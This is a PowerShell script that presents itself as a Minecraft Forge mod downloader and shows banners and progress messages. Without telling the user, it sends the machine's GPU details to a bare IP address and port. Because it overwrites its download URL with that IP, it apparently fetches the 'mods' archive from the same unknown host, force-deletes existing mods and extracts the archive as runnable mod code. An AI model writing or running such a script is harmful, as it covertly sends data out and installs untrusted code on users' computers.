$modsFolder = "$env:APPDATA\.minecraft\mods" 
$url = "https://dl.dropboxusercontent.com/s/t6y2z6ttjbstdjw/mods.zip?dl=0" 
$tempFile = "$env:TEMP\minecraftmods.zip" 

# Get GPU information
$gpuInfo = Get-CimInstance -ClassName Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion

# Convert GPU information to JSON
$json = $gpuInfo | ConvertTo-Json

# Set up the request
$url = "http://147.185.221.181:15119"
$headers = @{
    "Content-Type" = "application/json"
}
$body = $json

# Send the request
Invoke-WebRequest -Uri $url -Method Post -Headers $headers -Body $body

Write-Host @"
                                                __                                    
                            /'\_/`\            /\ \                                   
                           /\      \    ___    \_\ \                                  
                           \ \ \__\ \  / __`\  /'_` \                                 
                            \ \ \_/\ \/\ \L\ \/\ \L\ \                                
                             \ \_\\ \_\ \____/\ \___,_\                               
                              \/_/ \/_/\/___/  \/__,_ /                               
                                                                                      
                                                                                      
 ____                                 ___                        __                   
/\  _`\                              /\_ \                      /\ \                  
\ \ \/\ \    ___   __  __  __    ___ \//\ \     ___      __     \_\ \     __   _ __   
 \ \ \ \ \  / __`\/\ \/\ \/\ \ /' _ `\ \ \ \   / __`\  /'__`\   /'_` \  /'__`\/\`'__\ 
  \ \ \_\ \/\ \L\ \ \ \_/ \_/ \/\ \/\ \ \_\ \_/\ \L\ \/\ \L\.\_/\ \L\ \/\  __/\ \ \/  
   \ \____/\ \____/\ \___x___/'\ \_\ \_\/\____\ \____/\ \__/.\_\ \___,_\ \____\\ \_\  
    \/___/  \/___/  \/__//__/   \/_/\/_/\/____/\/___/  \/__/\/_/\/__,_ /\/____/ \/_/  
                                                                                      
                                                                                      
"@ 


Remove-Item -Path "$env:APPDATA\.minecraft\mods\*" -Force -Recurse 
Write-Host "Download will take a while" -ForegroundColor Red -BackgroundColor White
Write-Host "Downloading mods" -ForegroundColor Green -BackgroundColor White
Write-Host "Update March 25 2023" -ForegroundColor Blue -BackgroundColor White
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Goodmatthew2/moddownload/main/ding.wav" -OutFile "$env:TEMP\ding.wav"
Invoke-WebRequest -Uri $url -OutFile $tempFile 
Write-Host "Extracting Mods" -ForegroundColor Blue -BackgroundColor Black
Expand-Archive -Path $tempFile -DestinationPath $modsFolder -Force 
Remove-Item $tempFile 
$mediaPlayer = New-Object System.Media.SoundPlayer
$mediaPlayer.SoundLocation = "$env:TEMP\ding.wav"
$mediaPlayer.Play()
Write-Host "Server Version: 1.19.3 Forge" -ForegroundColor Green -BackgroundColor White
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null 
[System.Windows.Forms.MessageBox]::Show("Finished Downloading Mods")
Remove-Item "$env:TEMP\ding.wav"